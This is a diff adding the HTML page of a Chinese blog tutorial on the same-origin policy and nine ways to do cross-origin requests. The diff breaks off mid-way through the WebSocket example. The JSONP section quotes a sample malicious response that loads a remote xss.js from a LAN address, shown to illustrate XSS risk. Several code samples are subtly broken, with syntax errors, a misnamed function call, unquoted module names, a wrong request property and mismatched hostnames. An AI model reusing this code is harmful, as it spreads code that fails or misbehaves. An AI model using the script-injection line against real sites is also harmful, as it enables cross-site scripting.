@@ -1,0 +1,559 @@
+<!DOCTYPE html><html><head><script>var _hmt=_hmt||[]</script><script async src="//hm.baidu.com/hm.js?HIpscSc60YSz75aC"></script><meta charset="utf-8"><title>九种 “姿势” 让你彻底解决跨域问题 | Shen&#39;s Blog</title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="theme-color" content="#3F51B5"><meta name="keywords" content="JavaScript,HTTP,跨域,JSONP"><meta name="description" content="同源策略同源策略 SOP（Same origin policy）是一种约定，由 Netscape 公司 1995 年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到 XSS、CSRF 等攻击。所谓同源是指 “协议 + 域名 + 端口” 三者相同，即便两个不同的域名指向同一个 ip 地址，也非同源。"><meta property="og:type" content="article"><meta property="og:title" content="九种 “姿势” 让你彻底解决跨域问题"><meta property="og:url" content="https://www.overtaking.top/20180611010638/index.html"><meta property="og:site_name" content="Shen&#39;s Blog"><meta property="og:description" content="同源策略同源策略 SOP（Same origin policy）是一种约定，由 Netscape 公司 1995 年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到 XSS、CSRF 等攻击。所谓同源是指 “协议 + 域名 + 端口” 三者相同，即便两个不同的域名指向同一个 ip 地址，也非同源。"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://static.overtaking.top/images/HTTP/20180611010638/browser.png"><meta property="article:published_time" content="2018-06-10T17:06:38.000Z"><meta property="article:modified_time" content="2020-08-30T19:51:52.000Z"><meta property="article:author" content="Panda Shen"><meta property="article:tag" content="JavaScript"><meta property="article:tag" content="HTTP"><meta property="article:tag" content="跨域"><meta property="article:tag" content="JSONP"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://static.overtaking.top/images/HTTP/20180611010638/browser.png"><link rel="alternate" type="application/atom+xml" title="Shen&#39;s Blog" href="/rss2.xml"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="icon" type="image/png" sizes="16x16" href="/function%20small()%20%7B%20%5Bnative%20code%5D%20%7D"><link rel="stylesheet" href="/css/style.css?v=1.7.2"><link rel="stylesheet" href="/css/prism/prism-atom-dark.css?v=1.7.2"><script>window.lazyScripts=[]</script><meta name="generator" content="Hexo 4.2.1"></head><body><div id="loading" class="active"></div><aside id="menu" class="hide"><div class="inner flex-row-vertical"><a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off"><i class="icon icon-lg icon-close"></i></a><div class="brand-wrap" style="background-image:url(/img/brand-bg.jpg)"><div class="brand"><a href="/" class="avatar waves-effect waves-circle waves-light"><img src="/img/avatar.jpeg"></a><hgroup class="introduce"><h5 class="nickname">Panda Shen</h5><a href="mailto:pandashen821@163.com" title="pandashen821@163.com" class="mail">pandashen821@163.com</a></hgroup></div></div><div class="scroll-wrap flex-col"><ul class="nav"><li class="waves-block waves-effect"><a href="/"><i class="icon icon-lg icon-home"></i> Home</a></li><li class="waves-block waves-effect"><a href="/tags"><i class="icon icon-lg icon-tags"></i> Tags</a></li><li class="waves-block waves-effect"><a href="/categories"><i class="icon icon-lg icon-th-list"></i> Categories</a></li><li class="waves-block waves-effect"><a href="/archives"><i class="icon icon-lg icon-archives"></i> Archives</a></li><li class="waves-block waves-effect"><a href="/link"><i class="icon icon-lg icon-link"></i> Links</a></li><li class="waves-block waves-effect"><a href="/about"><i class="icon icon-lg icon-user"></i> About</a></li><li class="waves-block waves-effect"><a href="https://github.com/shenqiuhui" target="_blank"><i class="icon icon-lg icon-github"></i> Github</a></li></ul></div></div></aside><main id="main"><header class="top-header" id="header"><div class="flex-row"><a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle"><i class="icon icon-lg icon-navicon"></i></a><div class="flex-col header-title ellipsis">九种 “姿势” 让你彻底解决跨域问题</div><div class="search-wrap" id="search-wrap"><a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back"><i class="icon icon-lg icon-chevron-left"></i> </a><input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字"> <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search"><i class="icon icon-lg icon-search"></i></a></div><a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare"><i class="icon icon-lg icon-share-alt"></i></a></div></header><header class="content-header post-header"><div class="container fade-scale"><h1 class="title">九种 “姿势” 让你彻底解决跨域问题</h1><h5 class="subtitle"><time datetime="2018-06-10T17:06:38.000Z" itemprop="datePublished" class="page-time">2018-06-11</time><ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTTP/">HTTP</a></li></ul></h5></div></header><div class="container body-wrap"><aside class="post-widget"><nav class="post-toc-wrap post-toc-shrink" id="post-toc"><h4>文章目录</h4><ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#同源策略"><span class="post-toc-number">1.</span> <span class="post-toc-text">同源策略</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#什么是跨域？"><span class="post-toc-number">2.</span> <span class="post-toc-text">什么是跨域？</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#实现跨域的方式"><span class="post-toc-number">3.</span> <span class="post-toc-text">实现跨域的方式</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用-jsonp-跨域"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">使用 jsonp 跨域</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用-CORS-跨域"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">使用 CORS 跨域</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用-postMessage-实现跨域"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">使用 postMessage 实现跨域</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用-window-name-实现跨域"><span class="post-toc-number">3.4.</span> <span class="post-toc-text">使用 window.name 实现跨域</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用-location-hash-实现跨域"><span class="post-toc-number">3.5.</span> <span class="post-toc-text">使用 location.hash 实现跨域</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用-document-domain-实现跨域"><span class="post-toc-number">3.6.</span> <span class="post-toc-text">使用 document.domain 实现跨域</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用-WebSocket-实现跨域"><span class="post-toc-number">3.7.</span> <span class="post-toc-text">使用 WebSocket 实现跨域</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用-nginx-实现跨域"><span class="post-toc-number">3.8.</span> <span class="post-toc-text">使用 nginx 实现跨域</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#使用-http-proxy-middleware-实现跨域"><span class="post-toc-number">3.9.</span> <span class="post-toc-text">使用 http-proxy-middleware 实现跨域</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#非-vue-框架的跨域（2-次跨域）"><span class="post-toc-number">3.9.1.</span> <span class="post-toc-text">非 vue 框架的跨域（2 次跨域）</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#vue-框架的跨域（1-次跨域）"><span class="post-toc-number">3.9.2.</span> <span class="post-toc-text">vue 框架的跨域（1 次跨域）</span></a></li></ol></li></ol></li></ol></nav></aside><article id="post-HTTP/20180611010638" class="post-article article-type-post fade" itemprop="blogPost"><div class="post-card"><h1 class="post-card-title">九种 “姿势” 让你彻底解决跨域问题</h1><div class="post-meta"><time class="post-time" title="2018-06-11 01:06:38" datetime="2018-06-10T17:06:38.000Z" itemprop="datePublished">2018-06-11</time><ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/HTTP/">HTTP</a></li></ul><span id="/20180611010638/" class="leancloud-visitors" title="文章总阅读量" data-flag-title="九种 “姿势” 让你彻底解决跨域问题"><i class="icon icon-eye icon-pr post-meta-item-text"></i><span class="leancloud-visitors-count"></span></span></div><div class="post-content" id="post-content" itemprop="postContent"><img loading="lazy" src="//static.overtaking.top/images/HTTP/20180611010638/browser.png" title="跨域"><p><br></p><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><blockquote class="pullquote info"><p><strong>同源策略 <code>SOP</code>（Same origin policy）是一种约定，由 <code>Netscape</code> 公司 <code>1995</code> 年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到 <code>XSS</code>、<code>CSRF</code> 等攻击。所谓同源是指 “协议 + 域名 + 端口” 三者相同，即便两个不同的域名指向同一个 <code>ip</code> 地址，也非同源。</strong></p></blockquote><a id="more"></a><h2 id="什么是跨域？"><a href="#什么是跨域？" class="headerlink" title="什么是跨域？"></a>什么是跨域？</h2><p>当协议、域名、端口号，有一个或多个不同时，有希望可以访问并获取数据的现象称为跨域访问，同源策略限制下 <code>cookie</code>、<code>localStorage</code>、<code>dom</code>、<code>ajax</code>、<code>IndexDB</code> 都是不支持跨域的。</p><p>假设 <code>cookie</code> 支持了跨域，<code>http</code> 协议无状态，当用户访问了一个银行网站登录后，银行网站的服务器给返回了一个 <code>sessionId</code>，当通过当前浏览器再访问一个恶意网站，如果 <code>cookie</code> 支持跨域，恶意网站将获取 <code>sessionId</code> 并访问银行网站，出现安全性问题；<code>IndexDB</code>、<code>localStorage</code> 等数据存储在不同域的页面切换时是获取不到的；假设 <code>Dom</code> 元素可以跨域，在自己的页面写入一个 <code>iframe</code> 内部嵌入的地址是 <a href="javascript:;">www.baidu.com</a>，当在百度页面登录账号密码时就可以在自己的页面获取百度的数据信息，这显然是不合理的。</p><p>这就是为什么 <code>cookie</code>、<code>localStorage</code>、<code>dom</code>、<code>ajax</code>、<code>IndexDB</code> 会受到同源策略会限制，下面还有一点对跨域理解的误区：</p><blockquote class="pullquote warning"><ul><li><strong>误区：同源策略限制下，访问不到后台服务器的数据，或访问到后台服务器的数据后没有返回；</strong></li><li><strong>正确：同源策略限制下，可以访问到后台服务器的数据，后台服务器会正常返回数据，而被浏览器给拦截了。</strong></li></ul></blockquote><h2 id="实现跨域的方式"><a href="#实现跨域的方式" class="headerlink" title="实现跨域的方式"></a>实现跨域的方式</h2><h3 id="使用-jsonp-跨域"><a href="#使用-jsonp-跨域" class="headerlink" title="使用 jsonp 跨域"></a>使用 jsonp 跨域</h3><p><strong>使用场景：当自己的项目前端资源和后端部署在不同的服务器地址上，或者其他的公司需要访问自己对外公开的接口，需要实现跨域获取数据，如百度搜索。</strong></p><pre><code class="lang-js">/* 封装 jsonp */
+// 封装 jsonp 跨域请求的方法
+function jsonp({ url, params, cb }) {
+  return new Promise((resolve, reject) =&gt; {
+    // 创建一个 script 标签帮助我们发送请求
+    let script = document.createElement(&#39;script&#39;);
+    const arr = [];
+    params = { ...params, cb };
+
+    // 循环构建键值对形式的参数
+    for (let key in params) {
+      arr.push(key + &#39;=&#39; + params[key]);
+    }
+
+    // 创建全局函数
+    window[cb] = function (data) {
+      resolve(data);
+      // 在跨域拿到数据以后将 script 标签销毁
+      document.body.removeChild(script);
+    };
+
+    // 拼接发送请求的参数并赋值到 src 属性
+    script.src = url + &#39;?&#39; arr.join(&#39;&amp;&#39;);
+    document.body.appendChild(script);
+  });
+}
+
+// 调用方法跨域请求百度搜索的接口
+json({
+  url: &#39;https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su&#39;,
+  params: {
+    wd: &#39;jsonp&#39;
+  },
+  cb: &#39;show&#39;
+}).then(data =&gt; {
+  // 打印请求回的数据
+  console.log(data);
+});
+</code></pre><blockquote class="pullquote danger"><p><strong>缺点：</strong></p><ul><li><strong>只能发送 <code>get</code> 请求，不支持 <code>post</code>、<code>put</code>、<code>delete</code> 等；</strong></li><li><strong>不安全，容易引发 <code>xss</code> 攻击，会把别人的脚本引入到自己的页面中执行，如：弹窗、广告等，甚至更危险的脚本程序，如在返回的结果中返回了下面代码。</strong></li></ul></blockquote><pre><code class="lang-vim">`let script = document.createElement(&#39;script&#39;);
+script.src = &#39;http://192.168.0.57:8080/xss.js&#39;;
+document.body.appendChild(script);`;
+</code></pre><h3 id="使用-CORS-跨域"><a href="#使用-CORS-跨域" class="headerlink" title="使用 CORS 跨域"></a>使用 CORS 跨域</h3><blockquote class="pullquote info"><p><strong>跨源资源共享 <code>CORS</code>（Cross-Origin Resource Sharing）是 <code>W3C</code> 的一个工作草案，定义了在必须访问跨源资源时，浏览器与服务器应该如何沟通。<code>CORS</code> 背后的基本思想，就是使用自定义的 <code>HTTP</code> 头部让浏览器与服务器进行沟通，从而决定请求或响应是应该成功，还是应该失败。</strong></p></blockquote><p><strong>使用场景：多用于开发时，前端与后台在不同的 <code>ip</code> 地址下进行数据访问。</strong></p><p>现在启动两个端口号不同的服务器，创建跨域条件，服务器（<code>Node.js</code>）代码如下：</p><pre><code class="lang-js">/* 服务端代码 */
+// 服务器1
+const express = require(express);
+const app = express();
+app.use(express.static(__dirname));
+app.listen(3000);
+
+// 服务器2
+const express = require(&#39;express&#39;);
+const app = express();
+app.get(&#39;/getDate&#39;, function (req, res) {
+  res.end(&#39;I love you&#39;);
+});
+app.use(express.static(__dirname));
+app.listen(4000);
+</code></pre><p>由于我们的 <code>Node.js</code> 服务器使用 <code>express</code> 框架，在我们的项目根目录下的命令行中输入下面代码进行安装：</p><pre><code class="lang-bash">$ npm install express --save
+</code></pre><p>通过访问 <a href="javascript:;">http://localhost:3000/index.html</a> 获取 <code>index.html</code> 文件并执行其中的 <code>Ajax</code> 请求 <a href="javascript:;">http://localhost:4000/getDate</a> 接口去获取数据，<code>index.html</code> 文件内容如下：</p><pre><code class="lang-html">&lt;!-- 文件：index.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;CORS 跨域&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;script&gt;
+    const xhr = new XMLHttpRequest();
+
+    // 正常 cookie 是不允许跨域的
+    document.cookie = &#39;name=hello&#39;;
+
+    // cookie 想要实现跨域必须携带凭证
+    xhr.withCredentials = true;
+
+    // xhr.open(&#39;GET&#39;, &#39;http://localhost:4000/getDate&#39;, true);
+    xhr.open(&#39;PUT&#39;, &#39;http://localhost:4000/getDate&#39;, true);
+
+    // 设置名为 name 的自定义请求头
+    xhr.setRequestHeader(&#39;name&#39;, &#39;hello&#39;);
+
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4) {
+        if (xhr.status &gt;= 200 &amp;&amp; xhr.status &lt; 300 || xhr.status === 304) {
+          // 打印返回的数据
+          console.log(xhr.response);
+
+          // 打印后台设置的自定义头信息
+          console.log(xhr.getResponseHeader(&#39;name&#39;));
+        }
+      }
+    }
+    xhr.send();
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><p>上面 <code>index.html</code> 代码中发送请求访问不在同源的服务器 <code>2</code>，此时会在控制台给出错误信息，告诉我们缺少了哪些响应头，我们对应报错信息去修改访问的服务器 <code>2</code> 的代码，添加对应的响应头，实现 <code>CORS</code> 跨域。</p><pre><code class="lang-js">/* 服务端代码 */
+// 服务器2
+const express = require(&#39;express&#39;);
+const app = express();
+
+// 允许访问域的白名单
+const whiteList = [&#39;http://localhost:3000&#39;];
+
+app.use(function (req, res, next) {
+  let origin = req.header.origin;
+  if (whiteList.includes(origin)) {
+    // 设置那个源可以访问我，参数为 * 时
+    // 允许任何人访问，但是不可以和 cookie 凭证的响应头共同使用
+    res.setHeader(&#39;Access-Control-Allow-Origin&#39;, origin);
+
+    // 想要获取 ajax 的头信息，需设置响应头
+    res.setHeader(&#39;Access-Control-Allow-Headers&#39;, &#39;name&#39;);
+
+    // 处理复杂请求的头
+    res.setHeader(&#39;Access-Control-Allow-Methods&#39;, &#39;PUT&#39;);
+
+    // 允许发送 cookie 凭证的响应头
+    res.setHeader(&#39;Access-Control-Allow-Credentials&#39;, true);
+
+    // 允许前端获取哪个头信息
+    res.setHeader(&#39;Access-Control-Expose-Headers&#39;, &#39;name&#39;);
+
+    // 处理 OPTIONS 预检的存活时间，单位 s
+    res.setHeader(&#39;Access-Control-Max-Age&#39;, 5);
+
+    // 发送 PUT 请求会做一个试探性的请求 OPTIONS
+    // 其实是请求了两次，当接收的请求为 OPTIONS 时不做任何处理
+    if (req.method === &#39;OPTIONS&#39;) {
+      res.end();
+    }
+  }
+  next();
+});
+
+app.put(&#39;/getDate&#39;, function (req, res) {
+  // res.setHeader(&#39;name&#39;, &#39;nihao&#39;); // 设置自定义响应头信息
+  res.end(&#39;I love you&#39;);
+});
+
+app.get(&#39;/getDate&#39;, function (req, res) {
+  res.end(&#39;I love you&#39;);
+});
+
+app.use(express.static(__dirname));
+app.listen(4000);
+</code></pre><h3 id="使用-postMessage-实现跨域"><a href="#使用-postMessage-实现跨域" class="headerlink" title="使用 postMessage 实现跨域"></a>使用 postMessage 实现跨域</h3><blockquote class="pullquote info"><p><strong>postMessage 是 <code>H5</code> 的新 <code>API</code>，跨文档消息传送（cross-document messaging），有时候简称为 <code>XMD</code>，指的是在来自不同域的页面间传递消息。</strong></p></blockquote><blockquote class="pullquote primary"><p><strong>调用方式：</strong><code>window.postMessage(message, targetOrigin)</code></p><ul><li><strong><code>message</code>：发送的数据</strong></li><li><strong><code>targetOrigin</code>：发送的窗口的域</strong></li></ul></blockquote><blockquote class="pullquote default"><p><strong>在对应的页面中用 <code>message</code> 事件接收，事件对象中有 <code>data</code>、<code>origin</code>、<code>source</code> 三个重要信息：</strong></p><ul><li><strong><code>data</code>：接收到的数据</strong></li><li><strong><code>origin</code>：接收到数据源的域（数据来自哪个域）</strong></li><li><strong><code>source</code>：接收到数据源的窗口对象（数据来自哪个窗口对象）</strong></li></ul></blockquote><p><strong>使用场景：不是使用 <code>Ajax</code> 的数据通信，更多是在两个页面之间的通信，在 <code>A</code> 页面中引入 <code>B</code> 页面，在 <code>A</code>、<code>B</code> 两个页面之间通信。</strong></p><p>与上面 <code>CORS</code> 类似，我们要创建跨域场景，搭建两个端口号不同的 <code>Node.js</code> 服务器，后面相同方式就不多赘述了。</p><pre><code class="lang-js">/* 服务端代码 */
+// 服务器1
+const express = require(express);
+const app = express();
+app.use(express.static(__dirname));
+app.listen(3000);
+
+// 服务器2
+const express = require(express);
+const app = express();
+app.use(express.static(__dirname));
+app.listen(4000);
+</code></pre><p>通过访问 <a href="javascript:;">http://localhost:3000/a.html</a>，在 <code>a.html</code> 中使用 <code>iframe</code> 标签引入 <a href="javascript:;">http://localhost:4000/b.html</a>，在两个窗口间传递数据。</p><pre><code class="lang-html">&lt;!-- 文件：a.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;页面 A&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;iframe src=&quot;http://localhost:4000/b.html&quot; id=&quot;frame&quot; onload=&quot;load()&quot;&gt;
+  &lt;/iframe&gt;
+  &lt;script&gt;
+    function load() {
+      let frame = document.getElementById(&#39;frame&#39;);
+      frame.contentWindow.postMessage(&#39;I love you&#39;, &#39;http://localhost:4000&#39;);
+      window.onmessage = function (e) {
+        console.log(e.data);
+      }
+    }
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><pre><code class="lang-html">&lt;!-- 文件：b.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;页面 B&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;script&gt;
+    window.onmessage = function (e) {
+      // 打印来自页面 A 的消息
+      console.log(e.data);
+      // 给页面 A 发送回执
+      e.source.postMessage(&#39;I love you, too&#39;, e.origin);
+    }
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h3 id="使用-window-name-实现跨域"><a href="#使用-window-name-实现跨域" class="headerlink" title="使用 window.name 实现跨域"></a>使用 window.name 实现跨域</h3><p>同样是页面之间的通信，需要借助 <code>iframe</code> 标签，<code>A</code> 页面和 <code>B</code> 页面是同域的 <a href="javascript:;">http://localhost:3000</a>，<code>C</code> 页面在独立的域 <a href="javascript:;">http://localhost:4000</a>。</p><pre><code class="lang-js">/* 服务端代码 */
+// 服务器1
+const express = require(express);
+const app = express();
+app.use(express.static(__dirname));
+app.listen(3000);
+
+// 服务器2
+const express = require(express);
+const app = express();
+app.use(express.static(__dirname));
+app.listen(4000);
+</code></pre><p>实现思路：在 <code>A</code> 页面中将 <code>iframe</code> 的 <code>src</code> 指向 <code>C</code> 页面，在 <code>C</code> 页面中将属性值存入 <code>window.name</code> 中，再把 <code>iframe</code> 的 <code>src</code> 换成同域的 <code>B</code> 页面，在当前的 <code>iframe</code> 的 <code>window</code> 对象中取出 <code>name</code> 的值，访问 <a href="javascript:;">http://localhost:3000/a.html</a>。</p><pre><code class="lang-html">&lt;!-- 文件：a.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;页面 A&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;iframe src=&quot;http://localhost:4000/c.html&quot; id=&quot;frame&quot; onload=&quot;load()&quot;&gt;
+  &lt;/iframe&gt;
+  &lt;script&gt;
+    // 增加一个标识，第一次触发 load 时更改地址，更改后再次触发直接取值
+    let isFirst = true;
+    function load() {
+      let frame = document.getElementById(&#39;frame&#39;);
+      if (isFirst) {
+        frame.src = &#39;http://localhost:3000/b.html&#39;;
+        isFirst = false;
+      } else {
+        console.log(frame.contentWindow.name);
+      }
+    }
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><pre><code class="lang-html">&lt;!-- 文件：c.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;页面 C&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;script&gt;
+    window.name = &#39;I love you&#39;;
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h3 id="使用-location-hash-实现跨域"><a href="#使用-location-hash-实现跨域" class="headerlink" title="使用 location.hash 实现跨域"></a>使用 location.hash 实现跨域</h3><p>与 <code>window.name</code> 跨域的情况相同，是不同域的页面间的参数传递，需要借助 <code>iframe</code> 标签，<code>A</code> 页面和 <code>B</code> 页面是同域的 <a href="javascript:;">http://localhost:3000</a>，<code>C</code> 页面是独立的域 <a href="javascript:;">http://localhost:4000</a>。</p><pre><code class="lang-js">/* 服务端代码 */
+// 服务器1
+const express = require(express);
+const app = express();
+app.use(express.static(__dirname));
+app.listen(3000);
+
+// 服务器2
+const express = require(express);
+const app = express();
+app.use(express.static(__dirname));
+app.listen(4000);
+</code></pre><p>实现思路：<code>A</code> 页面通过 <code>iframe</code> 引入 <code>C</code> 页面，并给 <code>C</code> 页面传一个 <code>hash</code> 值，<code>C</code> 页面收到 <code>hash</code> 值后创建 <code>iframe</code> 引入 <code>B</code> 页面，把 <code>hash</code> 值传给 <code>B</code> 页面，<code>B</code> 页面将自己的 <code>hash</code> 值放在 <code>A</code> 页面的 <code>hash</code> 值中，访问 <a href="javascript:;">http://localhost:3000/a.html</a>。</p><pre><code class="lang-html">&lt;!-- 文件：a.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;页面 A&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;iframe src=&quot;http://localhost:4000/c.html#Iloveyou&quot; id=&quot;frame&quot;&gt;&lt;/iframe&gt;
+  &lt;script&gt;
+    // 使用 hashchange 事件接收来自 B 页面设置给 A 页面的 hash 值
+    window.onhashchange = function () {
+      console.log(location.hash);
+    }
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><pre><code class="lang-html">&lt;!-- 文件：c.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;页面 C&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;script&gt;
+    // 打印 A 页面引入 C 页面设置的 hash 值
+    console.log(location.hash);
+    let iframe = document.createElement(&#39;iframe&#39;);
+    iframe.src = &#39;http://localhost:3000/b.html#Iloveyoutoo&#39;;
+    document.body.appendChild(iframe);
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><pre><code class="lang-html">&lt;!-- 文件：b.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;页面 B&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;script&gt;
+    // 将 C 页面引入 B 页面设置的 hash 值设置给 A页面
+    window.parent.parent.location.hash = location.hash;
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h3 id="使用-document-domain-实现跨域"><a href="#使用-document-domain-实现跨域" class="headerlink" title="使用 document.domain 实现跨域"></a>使用 document.domain 实现跨域</h3><p><strong>使用场景：不是万能的跨域方式，大多使用于同一公司不同产品间获取数据，必须是一级域名和二级域名的关系，如</strong> <a href="javascript:;">www.baidu.com</a> <strong>与</strong> <a href="javascript:;">video.baidu.com</a> <strong>之间。</strong></p><pre><code class="lang-js">/* 服务端代码 */
+const express = require(&#39;express&#39;);
+const app = express();
+
+app.use(express.static(__dirname));
+app.listen(3000);
+</code></pre><p>想要模拟使用 <code>document.domain</code> 跨域的场景需要做些小小的准备，到 <a href="javascript:;">C:\Windows\System32\drivers\etc</a> 该路径下找到 <code>hosts</code> 文件，在最下面创建一个一级域名和一个二级域名。</p><pre><code class="lang-vim">127.0.0.1   www.domainacross.com
+127.0.0.1   sub.domainacross.com
+</code></pre><p>命名是随意的，只要是符合一级域名与 二级域名的关系即可，然后访问 <a href="javascript:;">http://www.domainacross.com:3000/a.html</a>。</p><pre><code class="lang-html">&lt;!-- 文件：a.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;页面 A&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;p&gt;我是页面 A 的内容&lt;/p&gt;
+  &lt;iframe
+    src=&quot;http://sucess.domainacross.com:3000/b.html&quot;
+    onload=&quot;load()&quot;
+    id=&quot;frame&quot;
+  &gt;&lt;/iframe&gt;
+  &lt;script&gt;
+    document.domain = &#39;domainacross.com&#39;;
+    function load() {
+      console.log(frame.contentWindow.message);
+    }
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><pre><code class="lang-html">&lt;!-- 文件：b.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;
+  &lt;title&gt;页面 B&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;p&gt;我是 B 页面的内容&lt;/p&gt;
+  &lt;script&gt;
+    document.domain = &#39;domainacross.com&#39;;
+    var message = &#39;Hello A&#39;;
+  &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre><h3 id="使用-WebSocket-实现跨域"><a href="#使用-WebSocket-实现跨域" class="headerlink" title="使用 WebSocket 实现跨域"></a>使用 WebSocket 实现跨域</h3><blockquote class="pullquote info"><p><strong><code>WebSocket</code> 没有跨域限制，高级 <code>API</code>（不兼容），想要兼容低版本浏览器，可以使用 <code>socket.io</code> 的库，<code>WebSocket</code> 与 <code>HTTP</code> 内部都是基于 <code>TCP</code> 协议，区别在于 <code>HTTP</code> 是单向的（单双工），<code>WebSocket</code> 是双向的（全双工），协议是 <code>ws://</code> 和 <code>wss://</code> 对应 <code>http://</code> 和 <code>https://</code>，因为没有跨域限制，所以使用 <code>file://</code> 协议也可以进行通信。</strong></p></blockquote><p>由于我们在 <code>Node.js</code> 服务中使用了 <code>WebSocket</code>，所以需要安装对应的依赖：</p><pre><code class="lang-bash">$ npm install ws --save
+</code></pre><pre><code class="lang-html">&lt;!-- 文件：index.html --&gt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;页面&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;script&gt;
+    // 创建 webSocket
+    const socket = new WebSocket(&#39;ws://localhost:3000&#39;);
+    // 连接上触发
+    socket.onopen = function () {
+      socket.send(&#39;I love you&#39;);
+    }
+    // 收到消息触发
